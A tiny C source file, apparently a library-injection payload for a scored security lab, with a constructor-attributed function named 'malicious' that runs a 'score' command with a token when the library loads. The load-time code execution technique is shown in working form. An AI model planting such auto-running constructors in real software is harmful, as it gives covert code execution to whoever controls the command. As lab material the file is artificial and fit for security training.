#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 2b54feeb-1dca-472b-83d2-92ba2cff755d");
}
